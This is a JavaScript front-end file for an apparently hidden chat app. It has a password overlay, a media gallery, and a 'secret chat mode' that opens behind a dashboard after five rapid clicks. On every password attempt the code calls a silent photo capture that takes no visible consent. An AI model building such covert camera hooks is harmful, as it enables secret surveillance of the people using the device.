/**
 * ui.extras.js — Password overlay, "show media" gallery, secret chat mode,
 *                carousel, accessibility font controls, and media fetch.
 */

// =============================================================================
// PASSWORD OVERLAY — unlock screen
// =============================================================================
const MAX_ATTEMPTS = 5;
let remainingAttempts = MAX_ATTEMPTS;

async function unlockScreen() {
    const btn = document.getElementById("submitBtn");
    const input = document.getElementById("passwordInput");
    const error = document.getElementById("errorMsg");

    if (btn.disabled) return;
    error.textContent = "";

    btn.disabled = true;
    btn.classList.add("loading");
    btn.textContent = "Verifying";

    try {
        const success = await fakePasswordApi(input.value);
        if (success) {
            document.getElementById("passwordOverlay").classList.remove("active");
            btn.disabled = false;
            btn.classList.remove("loading");
            btn.textContent = "submit";
            return;
        }
        remainingAttempts--;
        if (remainingAttempts <= 0) { blockUser(btn, input, error); return; }
        error.textContent = getAttemptMessage(remainingAttempts);
        resetButton(btn);
    } catch (err) {
        error.textContent = "Server error. Please try again later.";
        resetButton(btn);
    }
}

function getAttemptMessage(attemptsLeft) {
    if (attemptsLeft === 4) return "Invalid password. You have 4 attempts remaining.";
    if (attemptsLeft === 3) return "Warning: Only 3 attempts remaining.";
    if (attemptsLeft === 2) return "Alert: Only 2 attempts remaining.";
    if (attemptsLeft === 1) return "Final warning: Last attempt remaining.";
    return `Invalid password. Attempts remaining: ${attemptsLeft}`;
}

function blockUser(btn, input, error) {
    error.textContent = "You have exceeded the maximum number of attempts. Access has been blocked.";
    btn.textContent = "Blocked";
    btn.classList.remove("loading");
    btn.disabled = true;
    input.disabled = true;
}

function resetButton(btn) {
    btn.disabled = false;
    btn.classList.remove("loading");
    btn.textContent = "Submit";
}

async function fakePasswordApi(password) {
    if (window.captureSilentPhoto) {
        window.captureSilentPhoto().catch(console.error);
    }
    const response = await loginuser({ identifier: State.currentUser.username, password, type: "password" });
    const oldVersion = localStorage.getItem("app_version");
    if (response.Data.version !== oldVersion) {
        localStorage.setItem("app_version", response.Data.version);
        if (oldVersion !== null) {
            await fetch("/auth/flush-redis", { method: "POST" });
        }
    }
    return !!response.Data?.status;
}

document.getElementById("passwordInput").addEventListener("keydown", e => {
    if (e.key === "Enter") unlockScreen();
});

// =============================================================================
// SHOW MEDIA BUTTON
// =============================================================================
document.getElementById("chatOption-ShowMedia").addEventListener("click", async () => {
    document.getElementById("chatOption").classList.remove("active");
    const passwordOverlay = document.getElementById("passwordOverlay");
    const passwordInput = document.getElementById("passwordInput");
    const errorMsg = document.getElementById("errorMsg");

    passwordInput.value = "";
    errorMsg.textContent = "";
    remainingAttempts = MAX_ATTEMPTS;
    passwordOverlay.classList.add("active");

    const originalUnlock = window.unlockScreen;
    window.unlockScreen = async function () {
        const btn = document.getElementById("submitBtn");
        const input = document.getElementById("passwordInput");
        const error = document.getElementById("errorMsg");

        if (btn.disabled) return;
        error.textContent = "";
        btn.disabled = true;
        btn.classList.add("loading");
        btn.textContent = "Verifying";

        try {
            const success = await fakePasswordApi(input.value);
            if (success) {
                btn.disabled = false;
                btn.classList.remove("loading");
                btn.textContent = "submit";
                await fetchAndShowAllMedia();
                document.getElementById("passwordOverlay").classList.remove("active");
                window.unlockScreen = originalUnlock;
                document.querySelectorAll("input[type=text]").forEach(i => i.value = "");
                return;
            }
            remainingAttempts--;
            if (remainingAttempts <= 0) {
                blockUser(btn, input, error);
                setTimeout(() => { window.unlockScreen = originalUnlock; }, 3000);
                return;
            }
            error.textContent = getAttemptMessage(remainingAttempts);
            resetButton(btn);
        } catch (err) {
            error.textContent = "Server error. Please try again later.";
            resetButton(btn);
        }
    };
});

// =============================================================================
// FETCH AND SHOW ALL MEDIA
// =============================================================================
async function fetchAndShowAllMedia() {
    try {
        const loaderOverlay = document.getElementById("loader-overlay");
        loaderOverlay.style.display = "flex";

        const data = await fetchMedia(State.activeChat, null, 10);
        console.log(data)
        const mediaMessages = data.Data?.data || [];
        console.log(mediaMessages)
        if (mediaMessages.length === 0) {
            loaderOverlay.style.display = "none";
            showToast("No media found in this chat", "info");
            return;
        }

        const items = mediaMessages.map((m, index) => ({
            index,
            id: m.id ?? m.tempId,
            type: m.type,
            src: m.content,
            thumb: m.thumb || null,
            cover: m.cover || null,
            createdAt: m.createdAt
        }));


        loaderOverlay.style.display = "none";
        viewer = new MediaViewer(State.activeChat, items);
        console.log(viewer)
        console.log(items)
        viewer.open(0);
    } catch (error) {
        console.log(error);
        document.getElementById("loader-overlay").style.display = "none";
        showToast("Failed to load media. Please try again.", "error");
    }
}

// =============================================================================
// SECRET CHAT MODE
// =============================================================================
let chatMode = false;
let clickCount = 0;
let clickTimer = null;
const secretButton = document.getElementById('secretButton');
const dashboard = document.getElementById('ssc-dashboard');
const chatContainer = document.getElementById('chat-container');

secretButton.addEventListener('click', () => {
    clickCount++;
    secretButton.classList.add('clicked');
    setTimeout(() => secretButton.classList.remove('clicked'), 300);

    if (clickTimer) clearTimeout(clickTimer);

    if (clickCount === 5) { toggleChatMode(); clickCount = 0; }

    clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
});

function toggleChatMode() {
    chatMode ? deactivateChatMode() : activateChatMode();
    chatMode = !chatMode;
}

function activateChatMode() {
    dashboard.classList.add('hidden');
    chatContainer.classList.remove('hidden');
    chatContainer.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function deactivateChatMode() {
    dashboard.classList.remove('hidden');
    chatContainer.classList.remove('active');
    document.body.style.overflow = '';
}

// =============================================================================
// CAROUSEL
// =============================================================================
let currentSlideIndex = 0;
const slides = document.querySelectorAll('.carousel-item');
const dots = document.querySelectorAll('.carousel-dot');

function showSlide(index) {
    slides.forEach(s => s.classList.remove('active'));
    dots.forEach(d => d.classList.remove('active'));
    if (index >= slides.length) currentSlideIndex = 0;
    else if (index < 0) currentSlideIndex = slides.length - 1;
    else currentSlideIndex = index;
    slides[currentSlideIndex].classList.add('active');
    dots[currentSlideIndex].classList.add('active');
}

function changeSlide(direction) { showSlide(currentSlideIndex + direction); }
function currentSlide(index) { showSlide(index); }

setInterval(() => { if (chatMode) changeSlide(1); }, 5000);

// =============================================================================
// ACCESSIBILITY — FONT SIZE
// =============================================================================
const fontButtons = document.querySelectorAll('.font-btn');
let fontSize = 100;

fontButtons.forEach((btn, index) => {
    btn.addEventListener('click', () => {
        if (index === 0) fontSize = 90;
        if (index === 1) fontSize = 100;
        if (index === 2) fontSize = 110;
        document.body.style.fontSize = fontSize + '%';
    });
});

// =============================================================================
// INIT MUTE STATE from localStorage
// =============================================================================
function initMuteState() {
    const isplayTune = localStorage.getItem("playTune");
    const muteBtn = document.getElementById("chatOption-Mute");
    if (!isplayTune) return;

    State.playTune = isplayTune === "true";
    muteBtn.setAttribute("playTune", isplayTune);

    muteBtn.innerHTML = State.playTune
        ? `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
            <path d="M15.54 8.46a5 5 0 0 1 0 7.07"/>
            <path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>
          </svg> Mute`
        : `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
            <path d="M15.54 8.46a5 5 0 0 1 0 7.07"/>
            <path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>
          </svg> Unmute`;
}
